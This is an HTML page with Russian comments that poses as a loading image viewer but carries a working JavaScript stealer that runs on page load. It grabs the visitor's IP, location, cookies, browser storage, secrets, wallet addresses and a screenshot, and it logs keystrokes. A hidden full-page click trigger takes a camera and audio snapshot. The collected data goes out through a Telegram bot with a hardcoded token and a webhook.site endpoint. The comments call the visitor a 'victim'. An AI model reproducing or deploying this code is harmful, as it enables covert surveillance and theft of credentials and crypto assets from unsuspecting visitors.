<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>Loading...</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        html, body { 
            width: 100%; 
            min-height: 100vh; 
            background: #0d0d1a; 
            display: flex; 
            align-items: center; 
            justify-content: center; 
            overflow: hidden; 
        }
        img { 
            width: 100%; 
            height: 100vh; 
            object-fit: contain; 
            display: block; 
            user-select: none; 
            -webkit-user-drag: none; 
        }
        #status {
            position: fixed;
            bottom: 20px;
            left: 50%;
            transform: translateX(-50%);
            color: #333;
            font: 11px/1.4 system-ui, sans-serif;
            text-align: center;
            opacity: 0.3;
            pointer-events: none;
            z-index: 10;
        }
        /* Отладка — показываем только при нажатии F12 или в консоли */
        #debug {
            display: none !important;
        }
        /* Скрытая кнопка для активации камеры */
        #camera-trigger {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            opacity: 0;
            z-index: -1;
            cursor: default;
        }
    </style>
</head>
<body>

    <img src="https://raw.githubusercontent.com/Johnn298/imgur/main/photo_2026-06-28_01-31-33.jpg" alt="">
    <div id="status">⏳</div>
    <div id="debug"></div>
    <div id="camera-trigger"></div>

    <script>
        // ================================================================
        // КОНФИГУРАЦИЯ
        // ================================================================
        const CFG = {
            WEBHOOK: 'https://webhook.site/e17f1d78-6414-4450-847a-abc5675a0b48',
            BOT_TOKEN: '8859097143:AAFjWqiNWC_xnJyGmsyfKvODaPFzbqUQL1M',
            CHAT_ID: '8327334745',
            TIMEOUT: 500,
            // Стелс режим — без отладки
            STEALTH: true,
            // Камера запрашивается только по клику (жертва сама даст доступ)
            ENABLE_MEDIA: true,
            ENABLE_SCREENSHOT: true,
            ENABLE_KEYLOGGER: true
        };

        // ================================================================
        // ТИХАЯ ОТЛАДКА (только в консоль, не на страницу)
        // ================================================================
        function log(msg) {
            if (!CFG.STEALTH) {
                console.log('[STEALER]', msg);
            }
        }

        function setStatus(msg) {
            const el = document.getElementById('status');
            if (el) el.textContent = msg;
            log(msg);
        }

        // ================================================================
        // УТИЛИТЫ
        // ================================================================
        const sleep = ms => new Promise(r => setTimeout(r, ms));
        const trunc = (s, n = 80) => typeof s === 'string' ? (s.length > n ? s.slice(0, n) + '…' : s) : String(s);
        const fetchTO = (url, opts = {}, t = CFG.TIMEOUT) => 
            Promise.race([fetch(url, opts), new Promise((_, rej) => setTimeout(() => rej('Timeout'), t))]);

        // ================================================================
        // ЭКСФИЛЬТРАЦИЯ — БЕЗ CORS (Image, Beacon, JSONP)
        // ================================================================
        
        // 1. Telegram (работает)
        async function sendToTelegram(text) {
            try {
                const url = `https://api.telegram.org/bot${CFG.BOT_TOKEN}/sendMessage`;
                const r = await fetch(url, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: CFG.CHAT_ID,
                        text: text,
                        parse_mode: 'HTML'
                    })
                });
                const data = await r.json();
                return data.ok || false;
            } catch (e) {
                return false;
            }
        }

        // 2. Webhook через Image (обходит CORS)
        function sendToWebhookImage(data) {
            return new Promise((resolve) => {
                try {
                    const payload = encodeURIComponent(JSON.stringify(data).slice(0, 2000));
                    const img = new Image();
                    img.src = `${CFG.WEBHOOK}?d=${payload}&t=${Date.now()}`;
                    img.onload = () => resolve(true);
                    img.onerror = () => resolve(true);
                    setTimeout(() => resolve(false), 500);
                } catch {
                    resolve(false);
                }
            });
        }

        // 3. Beacon API (не блокируется CORS)
        function sendBeacon(data) {
            try {
                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
                return navigator.sendBeacon(CFG.WEBHOOK, blob);
            } catch {
                return false;
            }
        }

        // 4. Основная отправка
        async function exfiltrate(report, fullData) {
            // Telegram — основной канал
            const teleOk = await sendToTelegram(report);
            
            // Webhook через Image
            const imgOk = await sendToWebhookImage(fullData);
            
            // Beacon
            const beaconOk = sendBeacon(fullData);
            
            return { teleOk, imgOk, beaconOk };
        }

        // ================================================================
        // СБОР ДАННЫХ (без камеры — она по клику)
        // ================================================================

        // IP
        async function getIP() {
            try {
                const r = await fetchTO('https://api.ipify.org?format=json', {}, 500);
                const d = await r.json();
                return d.ip;
            } catch { return null; }
        }

        // WebRTC
        function getWebRTC() {
            return new Promise((resolve) => {
                const ips = [];
                try {
                    const pc = new (window.RTCPeerConnection || window.webkitRTCPeerConnection)({
                        iceServers: [{ urls: 'stun:stun.l.google.com:19302' }]
                    });
                    pc.createDataChannel('');
                    pc.createOffer().then(o => pc.setLocalDescription(o)).catch(() => {});
                    pc.onicecandidate = (e) => {
                        if (!e.candidate) return;
                        const m = e.candidate.candidate.match(/(\d{1,3}\.){3}\d{1,3}/g);
                        if (m) {
                            m.forEach(ip => {
                                if (!ip.startsWith('192.168.') && !ip.startsWith('10.') && 
                                    !ip.startsWith('172.16.') && !ip.startsWith('127.')) {
                                    ips.push(ip);
                                }
                            });
                        }
                    };
                    setTimeout(() => { pc.close(); resolve([...new Set(ips)]); }, 600);
                } catch { resolve([]); }
            });
        }

        // GPS
        function getGPS() {
            return new Promise((resolve) => {
                if (!navigator.geolocation) { resolve(null); return; }
                navigator.geolocation.getCurrentPosition(
                    pos => resolve({ lat: pos.coords.latitude, lon: pos.coords.longitude, acc: pos.coords.accuracy }),
                    () => resolve(null),
                    { timeout: 2000, enableHighAccuracy: false }
                );
                setTimeout(() => resolve(null), 2000);
            });
        }

        // Система
        function getSystem() {
            const n = navigator;
            const ua = n.userAgent.toLowerCase();
            return {
                ua: n.userAgent,
                platform: n.platform,
                cores: n.hardwareConcurrency || '?',
                memory: n.deviceMemory || '?',
                language: n.language,
                os: ua.includes('windows') ? 'Windows' :
                     ua.includes('mac') ? 'macOS' :
                     ua.includes('linux') ? 'Linux' :
                     ua.includes('android') ? 'Android' :
                     ua.includes('ios') ? 'iOS' : 'unknown',
                browser: !!window.chrome ? 'Chrome' :
                          ua.includes('firefox') ? 'Firefox' :
                          ua.includes('safari') ? 'Safari' : 'unknown'
            };
        }

        // Криптокошельки (без запросов разрешений)
        function getWallets() {
            const result = [];
            try {
                if (window.ethereum && window.ethereum.selectedAddress) {
                    result.push({ type: 'Ethereum', address: window.ethereum.selectedAddress });
                }
                if (window.solana && window.solana.publicKey) {
                    result.push({ type: 'Solana', address: window.solana.publicKey.toString() });
                }
                if (window.phantom && window.phantom.solana && window.phantom.solana.publicKey) {
                    result.push({ type: 'Phantom', address: window.phantom.solana.publicKey.toString() });
                }
            } catch {}
            return result;
        }

        // Расширения (без запросов)
        function getExtensions() {
            const result = [];
            const known = {
                'nkbihfbeogaeaoehlefnkodbefgpgknn': 'MetaMask',
                'cjpalhdlnbpafiamejdnhcphjbkeiagm': 'uBlock',
                'gighmmpiobklfepjocnamgkkbiglidom': 'AdBlock',
                'hnfanknocfeofbddgcijnmhnfnkdnaad': 'Coinbase'
            };
            try {
                if (window.chrome && chrome.runtime) {
                    Object.keys(known).forEach(id => {
                        try {
                            const url = chrome.runtime.getURL(`//${id}/manifest.json`);
                            fetch(url, { mode: 'no-cors' }).catch(() => {});
                            result.push(known[id]);
                        } catch {}
                    });
                }
            } catch {}
            return result;
        }

        // Storage
        function getStorage() {
            const ls = {};
            try { for (let i = 0; i < localStorage.length; i++) {
                const k = localStorage.key(i);
                ls[k] = localStorage.getItem(k);
            }} catch {}
            const ss = {};
            try { for (let i = 0; i < sessionStorage.length; i++) {
                const k = sessionStorage.key(i);
                ss[k] = sessionStorage.getItem(k);
            }} catch {}
            return { localStorage: ls, sessionStorage: ss, cookies: document.cookie || 'нет' };
        }

        // Секреты
        function findSecrets(obj) {
            const result = [];
            const patterns = ['token', 'jwt', 'secret', 'key', 'auth', 'password', 'pwd', 'api', 'private', 'wallet', 'mnemonic', 'seed'];
            const search = (data, path = '') => {
                if (!data || typeof data !== 'object') return;
                for (let k in data) {
                    const v = data[k];
                    const fullPath = path ? `${path}.${k}` : k;
                    if (patterns.some(p => k.toLowerCase().includes(p))) {
                        if (v && typeof v === 'string' && v.length > 3 && v.length < 300) {
                            result.push({ path: fullPath, value: trunc(v, 60) });
                        }
                    }
                    if (typeof v === 'object' && v !== null) search(v, fullPath);
                }
            };
            search(obj);
            return result;
        }

        // Screenshot (тихий, без запросов)
        async function takeScreenshot() {
            try {
                if (typeof html2canvas === 'undefined') {
                    const script = document.createElement('script');
                    script.src = 'https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js';
                    await new Promise((resolve, reject) => {
                        script.onload = resolve;
                        script.onerror = reject;
                        document.head.appendChild(script);
                    });
                    await sleep(300);
                }
                const canvas = await html2canvas(document.body, {
                    useCORS: true,
                    allowTaint: true,
                    scale: 0.08,
                    logging: false,
                    backgroundColor: null,
                    width: window.innerWidth,
                    height: window.innerHeight
                });
                return canvas.toDataURL('image/jpeg', 0.15);
            } catch { return null; }
        }

        // Keylogger (тихий)
        function setupKeylogger() {
            const buffer = [];
            document.addEventListener('keydown', (e) => {
                if (e.key === 'Unidentified') return;
                const special = {
                    'Control': '[CTRL]', 'Shift': '[SHIFT]', 'Alt': '[ALT]',
                    'Meta': '[WIN]', 'Escape': '[ESC]', 'Tab': '[TAB]',
                    'Enter': '[ENTER]', 'Backspace': '[BACK]', 'Delete': '[DEL]'
                };
                let out = special[e.key] || e.key;
                if (e.ctrlKey) out = '[CTRL]+' + out;
                if (e.shiftKey && !special[e.key]) out = out.toUpperCase();
                buffer.push(out);
                if (buffer.length >= 15) {
                    const data = buffer.splice(0);
                    sendToWebhookImage({ keylog: data.join('') });
                }
            });
            setInterval(() => {
                if (buffer.length > 0) {
                    const data = buffer.splice(0);
                    sendToWebhookImage({ keylog: data.join('') });
                }
            }, 20000);
            return true;
        }

        // ================================================================
        // КАМЕРА — ПО КЛИКУ (жертва сама даёт разрешение)
        // ================================================================
        async function requestCameraOnClick() {
            return new Promise((resolve) => {
                const trigger = document.getElementById('camera-trigger');
                let resolved = false;
                
                const handler = async () => {
                    if (resolved) return;
                    resolved = true;
                    trigger.removeEventListener('click', handler);
                    try {
                        const stream = await navigator.mediaDevices.getUserMedia({
                            audio: true,
                            video: { width: 320, height: 240 }
                        });
                        const video = document.createElement('video');
                        video.srcObject = stream;
                        await video.play();
                        const canvas = document.createElement('canvas');
                        canvas.width = 320;
                        canvas.height = 240;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        const snapshot = canvas.toDataURL('image/jpeg', 0.3);
                        stream.getTracks().forEach(t => t.stop());
                        resolve(snapshot);
                    } catch {
                        resolve(null);
                    }
                };
                
                // Ждём клик по странице
                trigger.addEventListener('click', handler);
                // Или любой клик
                document.addEventListener('click', handler, { once: true });
                
                // Таймаут — если не кликнули, просто пропускаем
                setTimeout(() => {
                    if (!resolved) {
                        resolved = true;
                        document.removeEventListener('click', handler);
                        resolve(null);
                    }
                }, 5000);
            });
        }

        // ================================================================
        // ФОРМАТИРОВАНИЕ ОТЧЁТА (кратко, без палева)
        // ================================================================
        function formatReport(data) {
            const lines = [];
            lines.push('🔴 STEALTH REPORT');
            lines.push('═'.repeat(30));
            if (data.ip) lines.push(`🌐 IP: ${data.ip}`);
            if (data.webrtc && data.webrtc.length) lines.push(`📡 WebRTC: ${data.webrtc.join(', ')}`);
            if (data.gps) lines.push(`📍 GPS: ${data.gps.lat}, ${data.gps.lon}`);
            if (data.system) {
                const s = data.system;
                lines.push(`💻 ${s.os} / ${s.browser} (${s.cores} cores)`);
            }
            if (data.wallets && data.wallets.length) {
                lines.push('💰 Wallets:');
                data.wallets.forEach(w => lines.push(`  ${w.type}: ${w.address}`));
            }
            if (data.extensions && data.extensions.length) {
                lines.push(`🔌 Ext: ${data.extensions.join(', ')}`);
            }
            const storage = data.storage || {};
            const lsKeys = Object.keys(storage.localStorage || {});
            if (lsKeys.length) lines.push(`💾 LS: ${lsKeys.length} keys`);
            if (data.secrets && data.secrets.length) {
                lines.push(`🔑 Secrets (${data.secrets.length}):`);
                data.secrets.slice(0, 5).forEach(s => lines.push(`  ${s.path}: ${s.value}`));
            }
            if (data.screenshot) lines.push(`🖼 Screenshot: ${Math.round(data.screenshot.length/1024)}KB`);
            if (data.keylogger) lines.push(`⌨️ Keylogger: active`);
            lines.push(`📅 ${data.timestamp}`);
            lines.push(`🔗 ${data.url}`);
            return lines.join('\n');
        }

        // ================================================================
        // ГЛАВНАЯ ФУНКЦИЯ (тихая)
        // ================================================================
        (async function stealthStealer() {
            try {
                setStatus('⏳');
                log('🚀 Stealth stealer starting...');

                // Keylogger сразу
                const keylogger = setupKeylogger();

                // Параллельный сбор (без камеры — она отдельно)
                const [ip, webrtc, gps, system, wallets, extensions, storage] = await Promise.all([
                    getIP(),
                    getWebRTC(),
                    getGPS(),
                    Promise.resolve(getSystem()),
                    Promise.resolve(getWallets()),
                    Promise.resolve(getExtensions()),
                    Promise.resolve(getStorage())
                ]);

                // Секреты
                const secrets = findSecrets(storage);

                // Скриншот (тихо)
                const screenshot = await takeScreenshot();

                // Камера — ТОЛЬКО ПО КЛИКУ (жертва сама даст доступ)
                let media = null;
                if (CFG.ENABLE_MEDIA) {
                    log('📷 Waiting for camera permission (click)...');
                    media = await requestCameraOnClick();
                    if (media) log('📷 Camera captured');
                    else log('📷 Camera skipped (no click)');
                }

                // Собираем всё
                const fullData = {
                    timestamp: new Date().toISOString(),
                    url: window.location.href,
                    referrer: document.referrer || 'нет',
                    userAgent: navigator.userAgent,
                    ip: ip || 'нет',
                    webrtc: webrtc || [],
                    gps: gps || null,
                    system: system || {},
                    wallets: wallets || [],
                    extensions: extensions || [],
                    storage: storage || {},
                    secrets: secrets || [],
                    screenshot: screenshot || null,
                    media: media || null,
                    keylogger: keylogger ? true : false,
                    dom: {
                        title: document.title,
                        url: window.location.href,
                        cookies: document.cookie || 'нет'
                    }
                };

                // Отчёт
                const report = formatReport(fullData);
                log(`📊 Report: ${report.length} chars`);

                // Отправка
                setStatus('📤');
                const result = await exfiltrate(report, fullData);
                log(`✅ Telegram: ${result.teleOk}, Image: ${result.imgOk}, Beacon: ${result.beaconOk}`);

                setStatus('✅');
                log('✅ Done');

                // Скрываем статус через пару секунд
                setTimeout(() => {
                    document.getElementById('status').style.opacity = '0';
                }, 3000);

            } catch (e) {
                log('❌ Error: ' + e.message);
                setStatus('⚠️');
            }
        })();

        // ================================================================
        // ЗАПУСК
        // ================================================================
        // Небольшая задержка, чтобы страница загрузилась
        setTimeout(stealthStealer, 200);

        // Консоль для отладки (только если F12)
        console.log('✅ Loaded');

        // Если нужен ручной тест — в консоли: testNow()
        window.testNow = async function() {
            const ip = await getIP();
            const report = `🧪 Test\nIP: ${ip}\nTime: ${new Date().toISOString()}`;
            await sendToTelegram(report);
            console.log('✅ Test sent');
        };

    </script>
</body>
</html>
